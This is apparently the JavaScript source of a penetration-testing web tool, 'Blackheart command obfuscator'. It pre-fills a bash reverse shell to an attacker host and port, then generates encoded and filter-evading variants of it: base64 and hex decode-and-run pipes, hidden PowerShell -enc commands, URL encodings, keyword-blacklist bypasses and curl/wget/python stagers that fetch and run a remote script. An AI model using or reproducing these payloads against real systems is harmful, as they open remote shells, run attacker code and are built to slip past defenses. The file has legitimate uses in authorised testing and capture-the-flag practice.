/* Blackheart command obfuscator — one command -> many encoded/obfuscated forms.
 * Uses window.TN.renderTpls so each output line gets the standard copy button. */
(function () {
  "use strict";
  var input = document.getElementById("obfIn"), out = document.getElementById("obfOut");
  if (!input) return;

  var VARS = window.VARS || {};
  var LHOST = VARS.LHOST || "10.10.14.5", LPORT = VARS.LPORT || "4444";
  input.value = "bash -c 'bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1'";

  function esc(s) { return String(s).replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }
  function b64(s) { return btoa(unescape(encodeURIComponent(s))); }
  function toHex(s, sep, pre) {
    var o = [];
    for (var i = 0; i < s.length; i++) o.push((pre || "") + s.charCodeAt(i).toString(16).padStart(2, "0"));
    return o.join(sep || "");
  }
  function urlenc(s) { return encodeURIComponent(s).replace(/[!'()*]/g, function (c) { return "%" + c.charCodeAt(0).toString(16).toUpperCase(); }); }
  function psEncode(s) {  // PowerShell -EncodedCommand = base64(UTF-16LE)
    var b = "";
    for (var i = 0; i < s.length; i++) { var c = s.charCodeAt(i); b += String.fromCharCode(c & 0xff, (c >> 8) & 0xff); }
    return btoa(b);
  }
  function ifsSpaces(s) { return s.replace(/ /g, "${IFS}"); }
  function quoteInsert(s) {  // break keywords with empty quotes: cat -> c""at (skips inside quotes crudely)
    return s.replace(/\b([a-zA-Z]{2,})\b/g, function (w) { return w[0] + '""' + w.slice(1); });
  }
  function backslashInsert(s) { return s.replace(/([a-zA-Z])(?=[a-zA-Z])/g, "$1\\"); }

  function group(title, hint, items) {
    var body = items.map(function (it) {
      return '<div class="cmd plain" data-tpl="' + it.tpl.replace(/"/g, "&quot;") + '">' +
             '<span class="lbl">' + esc(it.lbl) + '</span></div>';
    }).join("");
    return '<div class="card"><h3>' + esc(title) + '</h3>' +
           (hint ? '<p class="hint" style="margin-top:0">' + hint + '</p>' : "") + body + "</div>";
  }

  function render() {
    var c = input.value;
    if (!c.trim()) { out.innerHTML = ""; return; }
    var enc64 = b64(c);
    var html = "";

    html += group("Base64 (Linux / bash)", "Survives quote-hostile injection; decodes and runs in a subshell.", [
      { lbl: "echo | base64 -d | bash", tpl: "echo " + enc64 + " | base64 -d | bash" },
      { lbl: "bash -c $(...) form", tpl: 'bash -c "$(echo ' + enc64 + ' | base64 -d)"' },
      { lbl: "base64 -d | sh (no bash)", tpl: "echo " + enc64 + "|base64 -d|sh" },
    ]);

    html += group("PowerShell", "-EncodedCommand takes base64 of UTF-16LE. Use for Windows targets.", [
      { lbl: "powershell -enc", tpl: "powershell -nop -w hidden -enc " + psEncode(c) },
      { lbl: "pwsh -enc", tpl: "pwsh -nop -enc " + psEncode(c) },
    ]);

    html += group("URL encoding", "For command injection in web params / HTTP.", [
      { lbl: "single URL-encode", tpl: urlenc(c) },
      { lbl: "double URL-encode", tpl: urlenc(urlenc(c)) },
    ]);

    html += group("Hex", "Decode-and-run variants when only hex passes a filter.", [
      { lbl: "\\x escaped (printf | bash)", tpl: 'printf "' + toHex(c, "", "\\\\x") + '" | bash' },
      { lbl: "xxd reverse", tpl: "echo " + toHex(c) + " | xxd -r -p | bash" },
    ]);

    html += group("Shell character bypass", "Defeat naive keyword / space blacklists. Test per target — not all survive every parser.", [
      { lbl: "${IFS} instead of spaces", tpl: ifsSpaces(c) },
      { lbl: "empty-quote insertion", tpl: quoteInsert(c) },
      { lbl: "backslash insertion", tpl: backslashInsert(c) },
      { lbl: "brace expansion (comma)", tpl: "{" + c.trim().split(/\s+/).join(",") + "}" },
    ]);

    html += group("Remote stager", "When quoting the whole command is painful, host it and pull it.", [
      { lbl: "curl | bash", tpl: "curl -s http://" + LHOST + "/x.sh | bash" },
      { lbl: "wget -qO- | sh", tpl: "wget -qO- http://" + LHOST + "/x.sh | sh" },
      { lbl: "python fetch+exec", tpl: "python3 -c \"import urllib.request as u,os;os.system(u.urlopen('http://" + LHOST + "/x.sh').read().decode())\"" },
    ]);

    out.innerHTML = html;
    if (window.TN && TN.renderTpls) TN.renderTpls(out);  // wire copy buttons on the new blocks
  }

  input.addEventListener("input", render);
  render();
})();
